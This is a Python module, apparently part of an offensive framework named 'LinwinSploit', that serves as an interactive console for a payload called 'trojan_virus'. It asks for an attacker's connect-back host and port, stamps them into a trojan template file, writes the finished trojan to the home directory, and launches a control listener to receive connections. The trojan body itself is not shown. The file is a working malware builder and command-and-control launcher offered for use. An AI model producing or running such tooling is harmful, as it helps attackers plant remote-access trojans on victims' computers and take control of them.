import main
import os

class options():
    port: int = 8888

op = options()

def show_options():
    print()
    print(" ++++")
    print(" | host: " + "Default")
    print(" | port: " + str(op.port))
    print(" | Payload Name: program/python/trojan_virus")
    print(" ++++")
    print()

def console(runpath: str):
    print("Enter 'help' to get help.")
    print("Enter 'trojan_virus' to make a new trojan virus file.")
    print("Enter 'exit' to exit")
    print()

    while True:
        command = input("LinwinSploit - [program/python/trojan_virus] > ").strip()

        if command == 'help':
            print("""
 1. trojan_virus            Make a new trojan virus file.
 2. set port [local port]   Start a port on the local host.
 3. run                     Run the Trojan virus Service.
 4. show options            Show all the options you must input
            """)
            continue

        if command == 'trojan_virus':
            port: int = int(input("Enter your trojan virus connect port: "))
            host: str = input("Enter your trojan virus connect host IP: ")
            name: str = input("Virus Name: ")

            o = open(runpath+"/../Module/program/python/trojan_virus/trojan_virus.py")
            with open( os.environ['HOME'] + "/" + name + ".py" , "w") as f:
                f.write("connect: str=\""+host+"\"\n")
                f.write("port: int="+str(port))
                f.write(o.read())
            f.close()
            print(" [INFO] "+name+" make in "+os.environ['HOME'] + "/" + name+".py")
            continue

        if command.startswith("set port "):
            try :
                port: int = int(command[9:len(command)])
                op.port = port

            except:
                print("input error")
                continue

        if command == 'show options':
            show_options()

        if command == 'run':
            os.system("python3 "+runpath+"/../Module/program/python/trojan_virus/control.py "+str(op.port))
            continue
            
        if command == 'exit':
            main.main()